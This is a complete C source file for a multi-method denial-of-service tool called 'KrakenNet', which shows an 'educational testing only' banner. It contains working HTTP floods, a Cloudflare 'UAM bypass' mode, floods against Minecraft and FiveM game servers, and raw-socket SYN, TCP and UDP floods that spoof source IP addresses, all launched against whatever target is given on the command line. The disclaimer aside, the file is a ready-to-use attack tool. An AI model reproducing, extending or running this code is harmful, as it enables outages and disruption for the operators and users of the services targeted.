#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <sys/select.h>

// --- Constants ---
#define MAX_THREADS 4096
#define MAX_PACKET_SIZE 65535
#define PHI 0x9e3779b9

// --- Attack Categories ---
typedef enum {
    CAT_L7_HTTP = 0,
    CAT_L7_GAME,
    CAT_L4_TCP,
    CAT_L4_UDP,
    CAT_L4_AMP,
    CAT_ADVANCED
} attack_category_t;

// --- Global State and Stats ---
volatile int running = 1;
volatile long long total_success = 0;
volatile long long total_fail = 0;
volatile long long total_bytes = 0;
int attack_duration = 30;
int max_connections = 100;
int num_workers = 50;
char target_host[256];
int target_port = 80;
char attack_mode[50];
attack_category_t attack_category;
int pps_limit = 0;
int mbps_limit = 0;

// --- Enhanced CMWC PRNG ---
static unsigned long int Q[4096];
static unsigned long int C = 362436;
static int cmwc_i = 4095;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    
    cmwc_i = (cmwc_i + 1) & 4095;
    t = a * Q[cmwc_i] + C;
    C = (t >> 32);
    x = (unsigned int)t + C;
    if (x < C) {
        x++;
        C++;
    }
    Q[cmwc_i] = r - x;
    return Q[cmwc_i];
}

// --- Network Utilities ---
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (unsigned short)answer;
}

void generate_random_path(char *buffer, size_t max_len) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_~!@#$%^&*()=+[]{}|;:,.<>?";
    size_t path_len = (rand_cmwc() % 100) + 20;
    if (path_len >= max_len) path_len = max_len - 1;

    buffer[0] = '/';
    for (size_t i = 1; i < path_len; i++) {
        buffer[i] = chars[rand_cmwc() % (sizeof(chars) - 1)];
    }
    buffer[path_len] = '\0';
}

char* get_random_string(char **list, int count, const char *fallback) {
    if (count == 0) return (char*)fallback;
    return list[rand_cmwc() % count];
}

// --- Enhanced Headers and User Agents ---
char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
};
int ua_count = 8;

char* http_methods[] = {"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"};
int method_count = 9;

char* accept_headers[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "*/*"
};
int accept_count = 5;

// =============================================
// L7 HTTP/HTTPS METHODS
// =============================================

// --- UAM Bypass Worker (Advanced TLS) ---
size_t null_write(void *ptr, size_t size, size_t nmemb, void *userdata) {
    return size * nmemb;
}

void* uam_bypass_worker(void* arg) {
    char *host = (char*)arg;
    
    curl_global_init(CURL_GLOBAL_ALL);
    
    while (running) {
        CURL *curl = curl_easy_init();
        if (!curl) {
            usleep(10000);
            continue;
        }

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, null_write);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
        
        for (int i = 0; i < max_connections && running; i++) {
            char url[512];
            char path[128];
            generate_random_path(path, sizeof(path));
            
            if (target_port == 443)
                snprintf(url, sizeof(url), "https://%s%s", host, path);
            else
                snprintf(url, sizeof(url), "http://%s:%d%s", host, target_port, path);
            
            curl_easy_setopt(curl, CURLOPT_URL, url);
            
            char *method = http_methods[rand_cmwc() % method_count];
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method);
            
            struct curl_slist *headers = NULL;
            char ua_header[256], accept_header[256];
            snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", user_agents[rand_cmwc() % ua_count]);
            snprintf(accept_header, sizeof(accept_header), "Accept: %s", accept_headers[rand_cmwc() % accept_count]);
            
            headers = curl_slist_append(headers, ua_header);
            headers = curl_slist_append(headers, accept_header);
            headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
            headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
            headers = curl_slist_append(headers, "Cache-Control: no-cache");
            headers = curl_slist_append(headers, "Connection: keep-alive");
            
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            CURLcode res = curl_easy_perform(curl);
            
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            
            if (res == CURLE_OK && http_code > 0) {
                __sync_fetch_and_add(&total_success, 1);
            } else {
                __sync_fetch_and_add(&total_fail, 1);
            }

            curl_slist_free_all(headers);
            usleep(1000);
        }
        
        curl_easy_cleanup(curl);
        usleep(50000);
    }
    
    curl_global_cleanup();
    return NULL;
}

// --- HTTP FLOOD Worker ---
void* http_flood_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    
    // Resolve hostname
    struct hostent *he = gethostbyname(host);
    if (!he) {
        return NULL;
    }
    
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            usleep(1000);
            continue;
        }
        
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        memcpy(&server_addr.sin_addr, he->h_addr_list[0], he->h_length);
        
        // Non-blocking connect for speed
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        
        fd_set fdset;
        struct timeval tv;
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);
        tv.tv_sec = 0;
        tv.tv_usec = 10000; // 10ms timeout
        
        if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
            int so_error;
            socklen_t len = sizeof(so_error);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
            
            if (so_error == 0) {
                // Send HTTP requests rapidly
                for (int i = 0; i < 50 && running; i++) {
                    char request[2048];
                    char path[128];
                    generate_random_path(path, sizeof(path));
                    
                    snprintf(request, sizeof(request),
                        "%s %s HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Content-Length: 0\r\n"
                        "\r\n",
                        http_methods[rand_cmwc() % method_count], path, host,
                        user_agents[rand_cmwc() % ua_count],
                        accept_headers[rand_cmwc() % accept_count]);
                    
                    if (send(sock, request, strlen(request), MSG_DONTWAIT) > 0) {
                        __sync_fetch_and_add(&total_success, 1);
                    }
                    usleep(100);
                }
            }
        }
        
        close(sock);
        usleep(1000);
    }
    return NULL;
}

// =============================================
// L7 GAME METHODS
// =============================================

// --- Enhanced Minecraft Worker ---
int write_varint(char *buf, int value) {
    int i = 0;
    while (1) {
        unsigned char temp = value & 0x7F;
        value >>= 7;
        if (value != 0) temp |= 0x80;
        buf[i++] = temp;
        if (value == 0) break;
    }
    return i;
}

void* minecraft_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);

    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            usleep(1000);
            continue;
        }
        
        // Set socket options for performance
        int buf_size = 65536;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
        
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
        
        fd_set fdset;
        struct timeval tv;
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);
        tv.tv_sec = 0;
        tv.tv_usec = 5000; // 5ms timeout
        
        if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
            int so_error;
            socklen_t len = sizeof(so_error);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
            
            if (so_error == 0) {
                // Send handshake
                char handshake[256];
                int host_len = strlen(host);
                int data_len = 0;
                
                data_len += write_varint(handshake + data_len, 754); // Protocol
                data_len += write_varint(handshake + data_len, host_len);
                memcpy(handshake + data_len, host, host_len);
                data_len += host_len;
                *((uint16_t*)(handshake + data_len)) = htons(target_port);
                data_len += 2;
                data_len += write_varint(handshake + data_len, 1); // Status
                
                char packet[256];
                int packet_len = 0;
                packet_len += write_varint(packet, data_len + 1);
                packet[packet_len++] = 0x00; // Handshake packet ID
                memcpy(packet + packet_len, handshake, data_len);
                packet_len += data_len;
                
                send(sock, packet, packet_len, MSG_DONTWAIT);
                
                // Flood status requests
                for (int i = 0; i < 100 && running; i++) {
                    char status[5];
                    int status_len = write_varint(status, 1);
                    status[status_len++] = 0x00;
                    send(sock, status, status_len, MSG_DONTWAIT);
                    __sync_fetch_and_add(&total_success, 1);
                    usleep(100);
                }
            }
        }
        
        close(sock);
        usleep(1000);
    }
    return NULL;
}

// --- FiveM Flood Worker ---
void* fivem_flood_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    // High performance socket options
    int broadcast = 1;
    int buf_size = 65536;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    char payloads[10][2048];
    int payload_sizes[10];
    
    // Create various payload types
    for (int i = 0; i < 10; i++) {
        int size = 128 + (rand_cmwc() % 1920);
        payload_sizes[i] = size;
        for (int j = 0; j < size; j++) {
            payloads[i][j] = rand_cmwc() & 0xFF;
        }
    }
    
    while (running) {
        for (int i = 0; i < 500 && running; i++) {
            int idx = rand_cmwc() % 10;
            ssize_t sent = sendto(sock, payloads[idx], payload_sizes[idx], MSG_DONTWAIT,
                                 (struct sockaddr*)&server_addr, sizeof(server_addr));
            if (sent > 0) {
                __sync_fetch_and_add(&total_success, 1);
                __sync_fetch_and_add(&total_bytes, sent);
            }
        }
        usleep(1000);
    }
    close(sock);
    return NULL;
}

// =============================================
// L4 TCP METHODS
// =============================================

// --- SYN Flood Worker ---
void* syn_flood_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        printf("Raw socket failed (need root)\n");
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    // Pre-setup headers
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(packet));
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->daddr = sin.sin_addr.s_addr;
    
    tcph->dest = htons(target_port);
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    
    while (running) {
        // Rapid SYN generation
        for (int i = 0; i < 1000 && running; i++) {
            iph->id = htons(rand_cmwc() & 0xFFFF);
            iph->saddr = rand_cmwc();
            iph->check = 0;
            iph->check = csum((unsigned short*)iph, sizeof(struct iphdr));
            
            tcph->source = htons(rand_cmwc() & 0xFFFF);
            tcph->seq = rand_cmwc();
            tcph->check = 0;
            
            // Pseudo header for TCP checksum
            struct {
                uint32_t saddr, daddr;
                uint8_t zero, protocol;
                uint16_t tcp_len;
            } pseudo;
            pseudo.saddr = iph->saddr;
            pseudo.daddr = iph->daddr;
            pseudo.zero = 0;
            pseudo.protocol = IPPROTO_TCP;
            pseudo.tcp_len = htons(sizeof(struct tcphdr));
            
            char pseudo_packet[sizeof(pseudo) + sizeof(struct tcphdr)];
            memcpy(pseudo_packet, &pseudo, sizeof(pseudo));
            memcpy(pseudo_packet + sizeof(pseudo), tcph, sizeof(struct tcphdr));
            
            tcph->check = csum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));
            
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&sin, sizeof(sin));
            __sync_fetch_and_add(&total_success, 1);
        }
        usleep(1000);
    }
    close(sock);
    return NULL;
}

// --- TCP Advanced Flood ---
void* tcp_advanced_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        printf("Raw socket failed (need root)\n");
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + 512];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0x10; // High priority
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->daddr = sin.sin_addr.s_addr;
    
    tcph->dest = htons(target_port);
    tcph->doff = 5;
    tcph->window = htons(65535);
    
    int packet_counter = 0;
    
    while (running) {
        int payload_size = 64 + (rand_cmwc() % 448);
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size);
        iph->id = htons(rand_cmwc() & 0xFFFF);
        iph->saddr = rand_cmwc();
        iph->check = 0;
        iph->check = csum((unsigned short*)iph, sizeof(struct iphdr));
        
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->seq = rand_cmwc();
        tcph->ack_seq = rand_cmwc();
        tcph->check = 0;
        
        // Varied flags
        tcph->syn = (packet_counter % 10 == 0) ? 1 : 0;
        tcph->ack = (packet_counter % 3 == 0) ? 1 : 0;
        tcph->psh = (packet_counter % 5 == 0) ? 1 : 0;
        tcph->fin = (packet_counter % 20 == 0) ? 1 : 0;
        tcph->rst = (packet_counter % 50 == 0) ? 1 : 0;
        
        // Random payload
        for (int i = 0; i < payload_size; i++) {
            data[i] = rand_cmwc() & 0xFF;
        }
        
        // TCP checksum
        struct {
            uint32_t saddr, daddr;
            uint8_t zero, protocol;
            uint16_t tcp_len;
        } pseudo;
        pseudo.saddr = iph->saddr;
        pseudo.daddr = iph->daddr;
        pseudo.zero = 0;
        pseudo.protocol = IPPROTO_TCP;
        pseudo.tcp_len = htons(sizeof(struct tcphdr) + payload_size);
        
        char pseudo_packet[sizeof(pseudo) + sizeof(struct tcphdr) + payload_size];
        memcpy(pseudo_packet, &pseudo, sizeof(pseudo));
        memcpy(pseudo_packet + sizeof(pseudo), tcph, sizeof(struct tcphdr) + payload_size);
        
        tcph->check = csum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));
        
        sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size, 
               0, (struct sockaddr*)&sin, sizeof(sin));
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size);
        
        packet_counter++;
        
        if (packet_counter % 1000 == 0) usleep(1);
    }
    close(sock);
    return NULL;
}

// =============================================
// L4 UDP METHODS
// =============================================

// --- UDP Mega Flood ---
void* udp_mega_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        printf("Raw socket failed (need root)\n");
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 1472];
    struct iphdr *iph = (struct iphdr*)packet;
    struct udphdr *udph = (struct udphdr*)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->daddr = sin.sin_addr.s_addr;
    
    udph->dest = htons(target_port);
    
    unsigned int spoof_ips[] = {
        0x01010101, 0x0A000000, 0xAC100000, 0xC0A80000, // Common private ranges
        0xC6120B0A, 0xC6336401, 0xCB007100, 0xDEADBEEF
    };
    int ip_count = sizeof(spoof_ips) / sizeof(unsigned int);
    
    while (running) {
        for (int burst = 0; burst < 500 && running; burst++) {
            int payload_size = 512 + (rand_cmwc() % 960);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
            iph->id = htons(rand_cmwc() & 0xFFFF);
            iph->saddr = spoof_ips[rand_cmwc() % ip_count] + (rand_cmwc() & 0xFFFF);
            iph->check = 0;
            iph->check = csum((unsigned short*)iph, sizeof(struct iphdr));
            
            udph->source = htons(rand_cmwc() & 0xFFFF);
            udph->len = htons(sizeof(struct udphdr) + payload_size);
            udph->check = 0;
            
            // Fill with random data
            for (int i = 0; i < payload_size; i += 4) {
                unsigned int val = rand_cmwc();
                memcpy(data + i, &val, (payload_size - i >= 4) ? 4 : payload_size - i);
            }
            
            sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size,
                   0, (struct sockaddr*)&sin, sizeof(sin));
            
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
        }
        usleep(1000);
    }
    close(sock);
    return NULL;
}

// =============================================
// MAIN FUNCTION AND UI
// =============================================

void print_banner() {
    printf("\033[91m\n");
    printf("              ...-%@@@@@@@-..               \n");
    printf("             .:%@@@@@@@@@@@@%-.             \n");
    printf("            .#@@@@@@@@@@@@@@@@#.            \n");
    printf("           .%@@@@@@@@@@@@@@@@@@%.           \n");
    printf("           :@@@@@@@@@@@@@@@@@@@@:           \n");
    printf(" ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. \n");
    printf(":@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-\n");
    printf("\033[36m_____________________________________\n");
    printf("|      KrakenNet v3.0 (ADVANCED)     |\n");
    printf("|    EDUCATIONAL TESTING ONLY        |\n");
    printf("-------------------------------------\033[0m\n\n");
}

void print_stats(int remaining, long long current_success, long long current_fail, 
                long long current_bytes, attack_category_t category, double elapsed) {
    if (elapsed < 1.0) elapsed = 1.0;
    
    const char* category_names[] = {"L7-HTTP", "L7-GAME", "L4-TCP", "L4-UDP", "L4-AMP", "ADVANCED"};
    
    if (category == CAT_L7_HTTP || category == CAT_L7_GAME) {
        long long total = current_success + current_fail;
        double rate = (double)total / elapsed;
        printf("\r\033[34m[%s] Time: %ds | Reqs: %lld | Rate: %.0f/s | OK: %lld | Fail: %lld\033[0m",
               category_names[category], attack_duration - remaining, total, rate, 
               current_success, current_fail);
    } else {
        double rate = (double)current_bytes / elapsed;
        const char *units[] = {"Bps", "KBps", "MBps", "GBps"};
        int i = 0;
        double display_rate = rate;
        
        while (display_rate >= 1000.0 && i < 3) {
            display_rate /= 1000.0;
            i++;
        }

        printf("\r\033[34m[%s] Time: %ds | Pkts: %lld | Rate: %.2f %s | Bytes: %lld\033[0m",
               category_names[category], attack_duration - remaining, current_success, 
               display_rate, units[i], current_bytes);
    }
    fflush(stdout);
}

void signal_handler(int sig) {
    running = 0;
    printf("\n\033[33mShutting down...\033[0m\n");
}

void print_methods() {
    printf("\033[92mAvailable Methods by Category:\033[0m\n");
    printf("\033[96mL7 HTTP Methods:\033[0m\n");
    printf("  uam-bypass    - Advanced TLS/HTTP2 with UAM bypass\n");
    printf("  http-flood    - High-speed HTTP flood\n");
    printf("\n\033[96mL7 Game Methods:\033[0m\n");
    printf("  minecraft     - Minecraft server flood\n");
    printf("  fivem-flood   - FiveM UDP flood\n");
    printf("\n\033[96mL4 TCP Methods:\033[0m\n");
    printf("  syn-flood     - Traditional SYN flood\n");
    printf("  tcp-advanced  - Advanced TCP flag manipulation\n");
    printf("\n\033[96mL4 UDP Methods:\033[0m\n");
    printf("  udp-mega      - High-bandwidth UDP flood\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 7) {
        printf("\033[93mUsage: %s <target> <port> <method> <threads> <conns> <duration>\n", argv[0]);
        print_methods();
        printf("Example: %s 192.168.1.1 80 uam-bypass 100 50 60\033[0m\n");
        return 1;
    }

    signal(SIGINT, signal_handler);
    
    // Parse arguments
    strcpy(target_host, argv[1]);
    target_port = atoi(argv[2]);
    strcpy(attack_mode, argv[3]);
    num_workers = atoi(argv[4]);
    max_connections = atoi(argv[5]);
    attack_duration = atoi(argv[6]);

    if (num_workers > MAX_THREADS) {
        num_workers = MAX_THREADS;
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
    }
    
    init_rand(time(NULL));
    
    // Method configuration
    void *(*worker_func)(void*) = NULL;
    
    if (strcmp(attack_mode, "uam-bypass") == 0) {
        worker_func = uam_bypass_worker;
        attack_category = CAT_L7_HTTP;
    } else if (strcmp(attack_mode, "http-flood") == 0) {
        worker_func = http_flood_worker;
        attack_category = CAT_L7_HTTP;
    } else if (strcmp(attack_mode, "minecraft") == 0) {
        worker_func = minecraft_worker;
        attack_category = CAT_L7_GAME;
    } else if (strcmp(attack_mode, "fivem-flood") == 0) {
        worker_func = fivem_flood_worker;
        attack_category = CAT_L7_GAME;
    } else if (strcmp(attack_mode, "syn-flood") == 0) {
        worker_func = syn_flood_worker;
        attack_category = CAT_L4_TCP;
        printf("\033[91mNOTE: SYN flood requires root privileges\033[0m\n");
    } else if (strcmp(attack_mode, "tcp-advanced") == 0) {
        worker_func = tcp_advanced_worker;
        attack_category = CAT_L4_TCP;
        printf("\033[91mNOTE: Raw TCP requires root privileges\033[0m\n");
    } else if (strcmp(attack_mode, "udp-mega") == 0) {
        worker_func = udp_mega_worker;
        attack_category = CAT_L4_UDP;
        printf("\033[91mNOTE: Raw UDP requires root privileges\033[0m\n");
    } else {
        printf("\033[91mError: Unknown method '%s'\033[0m\n", attack_mode);
        print_methods();
        return 1;
    }

    printf("\033[32mTarget: %s:%d | Method: %s | Threads: %d | Duration: %ds\033[0m\n",
           target_host, target_port, attack_mode, num_workers, attack_duration);
    printf("\033[33mStarting attack in 3 seconds...\033[0m\n");
    sleep(3);

    // Resolve target
    struct hostent *he = gethostbyname(target_host);
    char target_ip[INET_ADDRSTRLEN];
    if (he) {
        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
        printf("\033[32mResolved: %s -> %s\033[0m\n", target_host, target_ip);
    } else {
        strcpy(target_ip, target_host);
        printf("\033[33mUsing target as IP: %s\033[0m\n", target_ip);
    }

    pthread_t threads[MAX_THREADS];
    
    // Start workers
    printf("Starting %d workers...\n", num_workers);
    for (int i = 0; i < num_workers; i++) {
        if (pthread_create(&threads[i], NULL, worker_func, (void*)target_ip) != 0) {
            perror("Failed to create thread");
            running = 0;
            break;
        }
    }

    // Progress tracking
    time_t start_time = time(NULL);
    time_t end_time = start_time + attack_duration;
    
    printf("\033[32mAttack started!\033[0m\n");
    
    while (running && time(NULL) < end_time) {
        long long success = total_success;
        long long fail = total_fail;
        long long bytes = total_bytes;
        int remaining = (int)(end_time - time(NULL));
        double elapsed = difftime(time(NULL), start_time);

        print_stats(remaining, success, fail, bytes, attack_category, elapsed);
        sleep(1);
    }
    
    running = 0;
    
    // Wait for threads
    printf("\nWaiting for threads to finish...\n");
    for (int i = 0; i < num_workers; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n\033[35mAttack Complete - Summary:\033[0m\n");
    printf("\033[32mMethod: %s | Duration: %d seconds\033[0m\n", attack_mode, attack_duration);
    
    if (attack_category == CAT_L7_HTTP || attack_category == CAT_L7_GAME) {
        long long total = total_success + total_fail;
        double rps = (double)total / attack_duration;
        printf("\033[32mSuccessful requests: %lld\033[0m\n", total_success);
        printf("\033[91mFailed requests: %lld\033[0m\n", total_fail);
        printf("\033[36mTotal requests: %lld\033[0m\n", total);
        printf("\033[33mAverage RPS: %.2f req/sec\033[0m\n", rps);
    } else {
        double bps = (double)total_bytes / attack_duration;
        const char *units[] = {"Bps", "KBps", "MBps", "GBps"};
        int i = 0;
        double display_bps = bps;
        
        while (display_bps >= 1000.0 && i < 3) {
            display_bps /= 1000.0;
            i++;
        }
        
        printf("\033[32mTotal packets sent: %lld\033[0m\n", total_success);
        printf("\033[36mTotal bytes sent: %lld\033[0m\n", total_bytes);
        printf("\033[33mAverage throughput: %.2f %s\033[0m\n", display_bps, units[i]);
    }

    return 0;
}
